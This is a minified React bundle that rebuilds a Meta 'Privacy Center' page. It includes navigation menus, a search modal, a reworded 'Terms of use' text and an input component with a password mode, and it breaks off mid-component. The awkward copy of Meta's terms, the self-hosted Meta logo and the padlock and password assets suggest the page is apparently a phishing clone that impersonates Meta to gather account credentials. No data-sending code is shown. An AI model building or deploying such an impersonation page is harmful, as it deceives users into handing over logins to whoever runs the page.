                      }), s.jsx("path", {
                          d: "m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z",
                          fill: "url(#:R1eckmkldd6knpapd5aqH3:)"
                      })]
                  })
              }), s.jsx("h1", {
                  className: "mb-1 mb-lg-3",
                  children: "Privacy Center"
              }), s.jsxs("div", {
                  className: "navBar__buttons",
                  children: [s.jsx(O, {
                      icon: s.jsx("svg", {
                          viewBox: "0 0 24 24",
                          fill: "currentColor",
                          width: "1em",
                          height: "1em",
                          "aria-hidden": "true",
                          className: "x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p",
                          children: s.jsx("path", {
                              fillRule: "evenodd",
                              clipRule: "evenodd",
                              d: "m19.007 9.997-6.338-5.704a1 1 0 0 0-1.338 0L4.993 9.997A3 3 0 0 0 4 12.227v6.61c0 .216.07.38.149.48a.432.432 0 0 0 .284.167c.86.14 2.04.29 3.567.391V16a3 3 0 0 1 3-3h2a3 3 0 0 1 3 3v3.875a37.895 37.895 0 0 0 3.567-.39.432.432 0 0 0 .284-.168.773.773 0 0 0 .149-.48v-6.61a3 3 0 0 0-.993-2.23zM3.655 8.51l6.338-5.704a3 3 0 0 1 4.014 0l6.338 5.704A5 5 0 0 1 22 12.227v6.61c0 1.292-.836 2.413-2.11 2.621-.94.153-2.208.312-3.833.418-1.125.073-2.057-.836-2.057-1.964V16a1 1 0 0 0-1-1h-2a1 1 0 0 0-1 1v3.912c0 1.128-.932 2.037-2.057 1.964a40.092 40.092 0 0 1-3.832-.418C2.836 21.25 2 20.13 2 18.838v-6.611A5 5 0 0 1 3.655 8.51z"
                          })
                      }),
                      changeFormShow: e,
                      text: "Privacy Center Home Page",
                      drop: !1,
                      style: "main collapsed"
                  }), s.jsx(O, {
                      changeFormShow: e,
                      icon: s.jsx("svg", {
                          viewBox: "0 0 24 24",
                          fill: "currentColor",
                          width: "1em",
                          height: "1em",
                          "aria-hidden": "true",
                          className: "x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p",
                          children: s.jsx("path", {
                              fillRule: "evenodd",
                              clipRule: "evenodd",
                              d: "M16.618 18.032a9 9 0 1 1 1.414-1.414l3.675 3.675a1 1 0 0 1-1.414 1.414l-3.675-3.675zM18 11a7 7 0 1 1-14 0 7 7 0 0 1 14 0z"
                          })
                      }),
                      text: "Search",
                      changeFormShow: i
                  }), s.jsxs(O, {
                      icon: s.jsxs("svg", {
                          viewBox: "0 0 24 24",
                          fill: "currentColor",
                          width: "1em",
                          height: "1em",
                          "aria-hidden": "true",
                          className: "x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p",
                          children: [s.jsx("path", {
                              d: "M12 12a2 2 0 0 1 1 3.732V17a1 1 0 1 1-2 0v-1.268A2 2 0 0 1 12 12z"
                          }), s.jsx("path", {
                              fillRule: "evenodd",
                              clipRule: "evenodd",
                              d: "M7 6a5 5 0 0 1 10 0v2h.857c1.282 0 2.417.818 2.664 2.076A25.71 25.71 0 0 1 21 15a25.71 25.71 0 0 1-.479 4.924C20.274 21.182 19.14 22 17.857 22H6.143c-1.282 0-2.417-.818-2.664-2.076A25.711 25.711 0 0 1 3 15c0-1.984.236-3.692.479-4.924C3.726 8.818 4.86 8 6.143 8H7V6zm8 0v2H9V6a3 3 0 1 1 6 0zm-8.857 4h11.714a.84.84 0 0 1 .508.157c.107.082.17.182.194.305.223 1.133.441 2.71.441 4.538 0 1.828-.218 3.405-.441 4.538a.488.488 0 0 1-.194.305.84.84 0 0 1-.508.157H6.143a.84.84 0 0 1-.508-.157.489.489 0 0 1-.194-.305A23.712 23.712 0 0 1 5 15c0-1.828.218-3.405.441-4.538a.489.489 0 0 1 .194-.305.84.84 0 0 1 .508-.157z"
                          })]
                      }),
                      text: "Privacy Policy",
                      drop: !0,
                      children: [s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "What is the Privacy Policy and what does it cover?",
                          drop: !1,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "What information do we collect?",
                          drop: !1,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "How do we use your information?",
                          drop: !1,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "How do we share your information on Meta Products or with integrated partners?",
                          drop: !1,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "How do we share information with third parties?",
                          drop: !1,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "How is the cooperation between Meta Companies organized?",
                          drop: !1,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "How can you manage or delete your information and exercise your rights?",
                          drop: !1,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "How long do we keep your information?",
                          drop: !1,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "How do we transmit information?",
                          drop: !1,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "How do we respond to official requests, comply with applicable laws, and prevent harm?",
                          drop: !1,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "How will you know when the policy changes?",
                          drop: !1,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "How to ask Meta questions?",
                          drop: !1,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "Why and how we process your data",
                          drop: !1,
                          changeFormShow: e
                      })]
                  }), s.jsxs(O, {
                      icon: s.jsx("svg", {
                          viewBox: "0 0 24 24",
                          fill: "currentColor",
                          width: "1em",
                          height: "1em",
                          "aria-hidden": "true",
                          className: "x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p",
                          children: s.jsx("path", {
                              fillRule: "evenodd",
                              clipRule: "evenodd",
                              d: "M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm0-13.702c.483 0 .875.391.875.875V17a.875.875 0 0 1-1.75 0v-6.827c0-.484.392-.875.875-.875zm0-1.275c.833 0 1.25-.405 1.25-1.012C13.25 6.405 12.833 6 12 6s-1.25.405-1.25 1.011c0 .607.417 1.012 1.25 1.012z"
                          })
                      }),
                      text: "Other rules and articles",
                      drop: !0,
                      children: [s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "Cookie Policy",
                          drop: !1,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "Information for those who do not use Meta Products",
                          drop: !1,
                          dopIcon: !0
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "How Meta uses information for generative AI models",
                          drop: !1,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "Data Transfer Framework Policy",
                          drop: !1,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "Other terms and conditions",
                          drop: !1,
                          dopIcon: !0,
                          changeFormShow: e
                      })]
                  }), s.jsxs(O, {
                      icon: s.jsxs("svg", {
                          viewBox: "0 0 24 24",
                          fill: "currentColor",
                          width: "1em",
                          height: "1em",
                          "aria-hidden": "true",
                          className: "x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p",
                          children: [s.jsx("path", {
                              fillRule: "evenodd",
                              clipRule: "evenodd",
                              d: "M16 12a4 4 0 1 1-8 0 4 4 0 0 1 8 0zm-2 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0z"
                          }), s.jsx("path", {
                              fillRule: "evenodd",
                              clipRule: "evenodd",
                              d: "m22.191 9.207-2.224 2.06a8.112 8.112 0 0 1 0 1.466l2.224 2.06a1 1 0 0 1 .187 1.233l-1.702 2.948a1 1 0 0 1-1.162.455l-2.895-.896a7.991 7.991 0 0 1-1.27.735l-.672 2.954a1 1 0 0 1-.975.778H10.3a1 1 0 0 1-.975-.778l-.672-2.954a8 8 0 0 1-1.27-.735l-2.895.896a1 1 0 0 1-1.162-.455l-1.702-2.948a1 1 0 0 1 .187-1.233l2.224-2.06a8.1 8.1 0 0 1 0-1.466L1.81 9.207a1 1 0 0 1-.187-1.233l1.702-2.948a1 1 0 0 1 1.162-.455l2.895.896a7.992 7.992 0 0 1 1.27-.735l.672-2.954A1 1 0 0 1 10.299 1h3.403a1 1 0 0 1 .975.778l.672 2.954a7.99 7.99 0 0 1 1.27.735l2.895-.896a1 1 0 0 1 1.162.455l1.702 2.948a1 1 0 0 1-.187 1.233zm-8.574-3.071.894.412c.335.155.653.34.952.551l.805.57 3.075-.951.903 1.564-2.36 2.186.09.98a6.093 6.093 0 0 1 0 1.104l-.09.98 2.36 2.185-.903 1.565-3.075-.951-.805.57a5.993 5.993 0 0 1-.952.55l-.894.413L12.904 21h-1.807l-.713-3.136-.894-.412a5.993 5.993 0 0 1-.952-.551l-.805-.57-3.075.951-.904-1.565 2.36-2.185-.089-.98a6.102 6.102 0 0 1 0-1.104l.09-.98-2.36-2.186.903-1.564 3.075.951.805-.57c.299-.212.617-.396.952-.55l.894-.413L11.097 3h1.807l.713 3.136z"
                          })]
                      }),
                      text: "Settings",
                      drop: !0,
                      children: [s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "Facebook Settings",
                          dopIcon: !0,
                          changeFormShow: e
                      }), s.jsx(O, {
                          icon: s.jsx("svg", {}),
                          text: "Instagram Settings",
                          dopIcon: !0,
                          changeFormShow: e
                      })]
                  })]
              })]
          })
      }), s.jsx("div", {
          className: "navBar__burger d-block d-lg-none",
          onClick: o,
          children: s.jsx("span", {})
      }), s.jsx("div", {
          className: `uiModal uiModal__search ${r&&"uiModal__active"}`,
          onClick: i,
          children: s.jsxs("div", {
              className: "uiModal__content",
              onClick: w => w.stopPropagation(),
              children: [s.jsx("div", {
                  className: "uiModal__close",
                  onClick: i
              }), s.jsx("h4", {
                  children: "Search"
              }), s.jsxs("div", {
                  className: "uiModal__input",
                  children: [s.jsx("svg", {
                      viewBox: "0 0 24 24",
                      fill: "currentColor",
                      width: "1em",
                      height: "1em",
                      "aria-hidden": "true",
                      className: "x1lliihq x1k90msu x2h7rmj x1qfuztq xfuq9xy xlup9mm x1kky2od",
                      children: s.jsx("path", {
                          fillRule: "evenodd",
                          clipRule: "evenodd",
                          d: "M16.618 18.032a9 9 0 1 1 1.414-1.414l3.675 3.675a1 1 0 0 1-1.414 1.414l-3.675-3.675zM18 11a7 7 0 1 1-14 0 7 7 0 0 1 14 0z"
                      })
                  }), s.jsx("input", {
                      placeholder: "Search the Privacy Center",
                      onChange: w => a(w.target.value),
                      value: u
                  }), u.length > 0 && s.jsx("svg", {
                      onClick: () => a(""),
                      viewBox: "0 0 24 24",
                      fill: "currentColor",
                      width: "1em",
                      height: "1em",
                      "aria-hidden": "true",
                      className: "x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 x1kpxq89 xsmyaan",
                      children: s.jsx("path", {
                          d: "M5.707 4.293a1 1 0 1 0-1.414 1.414L10.586 12l-6.293 6.293a1 1 0 1 0 1.414 1.414L12 13.414l6.293 6.293a1 1 0 0 0 1.414-1.414L13.414 12l6.293-6.293a1 1 0 1 0-1.414-1.414L12 10.586 5.707 4.293z"
                      })
                  })]
              }), m && s.jsxs("div", {
                  className: "fake-items",
                  children: [s.jsx("div", {}), s.jsx("div", {}), s.jsx("div", {})]
              }), d && !m && s.jsxs("div", {
                  className: "uiModal__nowfound",
                  children: [s.jsx("div", {
                      children: s.jsxs("svg", {
                          fill: "currentColor",
                          viewBox: "0 0 96 96",
                          width: "1em",
                          height: "1em",
                          "aria-hidden": "true",
                          className: "",
                          children: [s.jsx("circle", {
                              cx: "48",
                              cy: "48",
                              r: "47",
                              strokeLinecap: "round",
                              strokeLinejoin: "round",
                              fill: "none",
                              stroke: "currentColor",
                              strokeWidth: "2px"
                          }), s.jsx("path", {
                              d: "M48 54.682a3.43 3.43 0 0 1-3.52-3.062l-1.615-22.518a5.136 5.136 0 0 1 10.272 0L51.523 51.62A3.432 3.432 0 0 1 48 54.682zM48 71.046a5.114 5.114 0 1 1 5.114-5.114 5.114 5.114 0 0 1-5.114 5.114z",
                              strokeMiterlimit: "10",
                              fill: "none",
                              stroke: "currentColor",
                              strokeWidth: "2px"
                          })]
                      })
                  }), s.jsx("h4", {
                      children: "Nothing found"
                  }), s.jsx("p", {
                      children: "Use other keywords or check the spelling of the search term request."
                  })]
              })]
          })
      })]
  })
}
const Xd = "/assets/block.png",
  Yd = "/assets/unlock.png",
  Xs = "/assets/save.png",
  Jd = "/assets/doc.png";
var pc = {
  exports: {}
};
(function (e) {
  (function () {
      var t = {}.hasOwnProperty;

      function n() {
          for (var o = "", i = 0; i < arguments.length; i++) {
              var u = arguments[i];
              u && (o = l(o, r(u)))
          }
          return o
      }

      function r(o) {
          if (typeof o == "string" || typeof o == "number") return o;
          if (typeof o != "object") return "";
          if (Array.isArray(o)) return n.apply(null, o);
          if (o.toString !== Object.prototype.toString && !o.toString.toString().includes("[native code]")) return o.toString();
          var i = "";
          for (var u in o) t.call(o, u) && o[u] && (i = l(i, u));
          return i
      }

      function l(o, i) {
          return i ? o ? o + " " + i : o + i : o
      }
      e.exports ? (n.default = n, e.exports = n) : window.classNames = n
  })()
})(pc);
var bd = pc.exports;
const hc = Js(bd),
  ef = ["xxl", "xl", "lg", "md", "sm", "xs"],
  tf = "xs",
  nf = T.createContext({
      prefixes: {},
      breakpoints: ef,
      minBreakpoint: tf
  });

function mc(e, t) {
  const {
      prefixes: n
  } = T.useContext(nf);
  return e || n[t] || t
}
const rf = ["as", "disabled"];

function lf(e, t) {
  if (e == null) return {};
  var n = {},
      r = Object.keys(e),
      l, o;
  for (o = 0; o < r.length; o++) l = r[o], !(t.indexOf(l) >= 0) && (n[l] = e[l]);
  return n
}

function of (e) {
  return !e || e.trim() === "#"
}

function vc({
  tagName: e,
  disabled: t,
  href: n,
  target: r,
  rel: l,
  role: o,
  onClick: i,
  tabIndex: u = 0,
  type: a
}) {
  e || (n != null || r != null || l != null ? e = "a" : e = "button");
  const d = {
      tagName: e
  };
  if (e === "button") return [{
      type: a || "button",
      disabled: t
  }, d];
  const v = h => {
          if ((t || e === "a" && of (n)) && h.preventDefault(), t) {
              h.stopPropagation();
              return
          }
          i == null || i(h)
      },
      m = h => {
          h.key === " " && (h.preventDefault(), v(h))
      };
  return e === "a" && (n || (n = "#"), t && (n = void 0)), [{
      role: o ?? "button",
      disabled: void 0,
      tabIndex: t ? void 0 : u,
      href: n,
      target: e === "a" ? r : void 0,
      "aria-disabled": t || void 0,
      rel: e === "a" ? l : void 0,
      onClick: v,
      onKeyDown: m
  }, d]
}
const sf = T.forwardRef((e, t) => {
  let {
      as: n,
      disabled: r
  } = e, l = lf(e, rf);
  const [o, {
      tagName: i
  }] = vc(Object.assign({
      tagName: n,
      disabled: r
  }, l));
  return s.jsx(i, Object.assign({}, l, o, {
      ref: t
  }))
});
sf.displayName = "Button";
const yc = T.forwardRef(({
  as: e,
  bsPrefix: t,
  variant: n = "primary",
  size: r,
  active: l = !1,
  disabled: o = !1,
  className: i,
  ...u
}, a) => {
  const d = mc(t, "btn"),
      [v, {
          tagName: m
      }] = vc({
          tagName: e,
          disabled: o,
          ...u
      }),
      h = m;
  return s.jsx(h, {
      ...v,
      ...u,
      ref: a,
      disabled: o,
      className: hc(i, d, l && "active", n && `${d}-${n}`, r && `${d}-${r}`, u.href && o && "disabled")
  })
});
yc.displayName = "Button";
const Rt = yc,
  gc = T.forwardRef(({
      bsPrefix: e,
      variant: t,
      animation: n = "border",
      size: r,
      as: l = "div",
      className: o,
      ...i
  }, u) => {
      e = mc(e, "spinner");
      const a = `${e}-${n}`;
      return s.jsx(l, {
          ref: u,
          ...i,
          className: hc(o, a, r && `${a}-${r}`, t && `text-${t}`)
      })
  });
gc.displayName = "Spinner";
const Fi = gc;

function ot({
  title: e,
  links: t,
  changeFormShow: n,
  indexForm: r
}) {
  return s.jsxs("div", {
      className: "list",
      children: [s.jsx("h6", {
          className: "mb-4",
          children: e
      }), s.jsx("div", {
          className: "list__links",
          children: t.map((l, o) => s.jsxs("div", {
              className: "list__link",
              onClick: () => n ? n(r) : null,
              children: [l.img && s.jsx("div", {
                  className: "list__link--img",
                  children: s.jsx("img", {
                      src: l.img,
                      alt: ""
                  })
              }), l.icon && s.jsx("div", {
                  className: "list__link--svg",
                  children: l.icon
              }), s.jsxs("div", {
                  className: "list__link--text",
                  children: [l.title && s.jsxs(s.Fragment, {
                      children: [s.jsx("span", {
                          className: "list__link--title",
                          children: l.title
                      }), s.jsx("br", {})]
                  }), s.jsx("span", {
                      className: "list__link--subtitle",
                      children: l.subtitle
                  })]
              }), s.jsx("div", {
                  className: "list__link--arrow",
                  children: s.jsx("svg", {
                      viewBox: "0 0 24 24",
                      fill: "currentColor",
                      width: "1em",
                      height: "1em",
                      className: "x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od",
                      children: s.jsx("path", {
                          fillRule: "evenodd",
                          clipRule: "evenodd",
                          d: "M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z"
                      })
                  })
              })]
          }, o + "_" + l.img + Date.now()))
      })]
  })
}
const uf = "/assets/password.png";

function et({
  disabled: e,
  className: t,
  keyValue: n,
  placeholder: r,
  value: l,
  setValue: o,
  title: i,
  textArea: u = !1,
  description: a,
  isPassword: d = !1
}) {
  const [v, m] = T.useState(d);
  return s.jsxs("div", {
      className: `uiInput mb-3 ${t}`,
      children: [s.jsx("label", {
          children: i
      }), s.jsxs("div", {
          className: "uiInput__content",
          children: [u ? s.jsx("textarea", {
              onChange: h => o(x => ({
                  ...x,
                  [n]: h.target.value
              }))
          }) : s.jsx("input", {
              className: v ? "pass-style" : "text",
              disabled: e,
              type: "text",
              value: l,
              placeholder: r,
              onChange: h => o(n ? x => ({
                  ...x,
                  [n]: h.target.value
              }) : h.target.value)
          }), d && s.jsx("img", {
              className: "uiInput__showPassword",
              onClick: () => m(h => !h),
              src: uf,
              alt: ""
          })]
      }), a && s.jsx("p", {
          children: a
      })]
  })
}
const kl = "/assets/meta-logo-grey.png";

function af({
  show: e,
  setShow: t
}) {
  return s.jsx("div", {
      className: `form ${e&&"active"}`,
      onClick: () => t(!1),
      children: s.jsxs("div", {
          className: "form__content",
          onClick: n => n.stopPropagation(),
          children: [s.jsx("div", {
              className: "modal-header justify-content-end",
              children: s.jsx("div", {
                  className: "form__close",
                  onClick: () => t(!1)
              })
          }), s.jsxs("div", {
              className: "form__scroll",
              children: [s.jsx("h4", {
                  children: "Terms of use"
              }), s.jsxs("p", {
                  children: [s.jsx("span", {
                      className: "Meta"
                  }), " creates technologies and services that allow people to communicate with each other, form communities and develop companies. This User Agreement governs the use of you ", s.jsx("span", {
                      className: "Facebook"
                  }), ", Messenger, and other products, features, applications, services, technologies and software we offer(", s.jsxs("a", {
                      href: "#",
                      className: "add-svg",
                      children: [s.jsx("span", {
                          className: "Meta"
                      }), " Products", s.jsxs("svg", {
                          viewBox: "0 0 24 24",
                          fill: "currentColor",
                          width: "1em",
                          height: "1em",
                          className: "x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e",
                          children: [s.jsx("path", {
                              d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                          }), s.jsx("path", {
                              d: "M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                          })]
                      })]
                  }), "or ", s.jsxs("a", {
                      href: "#",
                      className: "add-svg",
                      children: ["Products", s.jsxs("svg", {
                          viewBox: "0 0 24 24",
                          fill: "currentColor",
                          width: "1em",
                          height: "1em",
                          className: "x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e",
                          children: [s.jsx("path", {
                              d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                          }), s.jsx("path", {
                              d: "M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                          })]
                      })]
                  }), "), if not expressly states that separate terms apply (and this agreement does not apply). These Products are provided to you by ", s.jsx("span", {
                      className: "Meta"
                  }), " Platforms, Inc."]
              }), s.jsx("br", {}), s.jsxs("p", {
                  children: ["Our ", s.jsxs("a", {
                      href: "#",
                      className: "add-svg",
                      children: ["Privacy Policy", s.jsxs("svg", {
                          viewBox: "0 0 24 24",
                          fill: "currentColor",
                          width: "1em",
                          height: "1em",
                          className: "x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e",
                          children: [s.jsx("path", {
                              d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                          }), s.jsx("path", {
                              d: "M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                          })]
                      })]
                  }), " explains how we collect and use your personal data to determine which advertisements may be relevant to you, and provide other services described below. Also, in ", s.jsxs("a", {
                      href: "#",
                      className: "add-svg",
                      children: ["settings", s.jsxs("svg", {
                          viewBox: "0 0 24 24",
                          fill: "currentColor",
                          width: "1em",
                          height: "1em",
                          className: "x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e",
                          children: [s.jsx("path", {
                              d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                          }), s.jsx("path", {
                              d: "M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                          })]
                      })]
                  }), " of the relevant Products", s.jsx("span", {
                      className: "Meta"
                  }), ", you can change your privacy level at any time regarding our use of your data."]
              }), s.jsx("br", {}), s.jsx("h6", {
                  children: "Services we provide "
              }), s.jsxs("ul", {
                  children: [s.jsx("li", {
                      children: "Personalize your experience."
                  }), s.jsx("li", {
                      children: "Connect with people and organizations that interest you."
                  }), s.jsx("li", {
                      children: "Opportunity to express yourself and communicate on topics that are important to you."
                  }), s.jsx("li", {
                      children: "Search for content, products and services that may interest you."
                  }), s.jsx("li", {
                      children: "Ensuring the safety, security and integrity of our services, combating malicious behavior and protecting our user community."
                  }), s.jsx("li", {
                      children: "Using and developing advanced technologies to provide safe and functional services."
                  }), s.jsx("li", {
                      children: "Research ways to improve the quality of our services."
                  }), s.jsx("li", {
                      children: "Ensuring consistency and convenience of various Meta Companies Products."
                  }), s.jsx("li", {
                      children: "Providing access to our services."
                  })]
              }), s.jsx("h6", {
                  children: "Other terms and policies that may apply to you"
              }), s.jsxs("ul", {
                  children: [s.jsxs("li", {
                      children: [s.jsxs("a", {
                          href: "#",
                          className: "add-svg",
                          children: ["Advertising Rules", s.jsxs("svg", {
                              viewBox: "0 0 24 24",
                              fill: "currentColor",
                              width: "1em",
                              height: "1em",
                              className: "x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e",
                              children: [s.jsx("path", {
                                  d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                              }), s.jsx("path", {
                                  d: "M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                              })]
                          })]
                      }), ". These rules apply to partners who advertise on various Meta Products and determine the types of advertising content that such partners are permitted to use."]
                  }), s.jsxs("li", {
                      children: [s.jsxs("a", {
                          href: "#",
                          className: "add-svg",
                          children: ["Community Standards", s.jsxs("svg", {
                              viewBox: "0 0 24 24",
                              fill: "currentColor",
                              width: "1em",
                              height: "1em",
                              className: "x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e",
                              children: [s.jsx("path", {
                                  d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                              }), s.jsx("path", {
                                  d: "M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                              })]
                          })]
                      }), ". These guidelines set out our standards for the content you post on Facebook and your activities on Facebook and other Meta Products."]
                  }), s.jsxs("li", {
                      children: [s.jsxs("a", {
                          href: "#",
                          className: "add-svg",
                          children: ["Community Payment Terms", s.jsxs("svg", {
                              viewBox: "0 0 24 24",
                              fill: "currentColor",
                              width: "1em",
                              height: "1em",
                              className: "x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e",
                              children: [s.jsx("path", {
                                  d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                              }), s.jsx("path", {
                                  d: "M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                              })]
                          })]
                      }), ". These terms apply to payments made to or through the ", s.jsx("span", {
                          className: "Meta"
                      }), " Products."]
                  }), s.jsxs("li", {
                      children: [s.jsxs("a", {
                          href: "#",
                          className: "add-svg",
                          children: ["Commercial terms", s.jsxs("svg", {
                              viewBox: "0 0 24 24",
                              fill: "currentColor",
                              width: "1em",
                              height: "1em",
                              className: "x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e",
                              children: [s.jsx("path", {
                                  d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                              }), s.jsx("path", {
                                  d: "M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                              })]
                          })]
                      }), ". These terms apply if you use or access our Products for any commercial or business purposes, including advertising, using our measurement services, managing an application on our Platform, a group or a Company Page, and selling goods or services ."]
                  }), s.jsxs("li", {
                      children: [s.jsxs("a", {
                          href: "#",
                          className: "add-svg",
                          children: ["Trade Rules", s.jsxs("svg", {
                              viewBox: "0 0 24 24",
                              fill: "currentColor",
                              width: "1em",
                              height: "1em",
                              className: "x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e",
                              children: [s.jsx("path", {
                                  d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                              }), s.jsx("path", {
                                  d: "M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                              })]
                          })]
                      }), ". This guide outlines the rules that apply when you offer products or services for sale on ", s.jsx("span", {
                          className: "Facebook"
                      }), ", ", s.jsx("span", {
                          className: "Instagram"
                      }), " or ", s.jsx("span", {
                          className: "WhatsApp"
                      }), "."]
                  })]
              }), s.jsx("p", {
                  children: "Last revision date: July 26, 2023"
              }), s.jsx("br", {}), s.jsx(ot, {
                  title: "Data control",
                  links: [{
                      title: "Account security",
                      icon: s.jsxs("svg", {
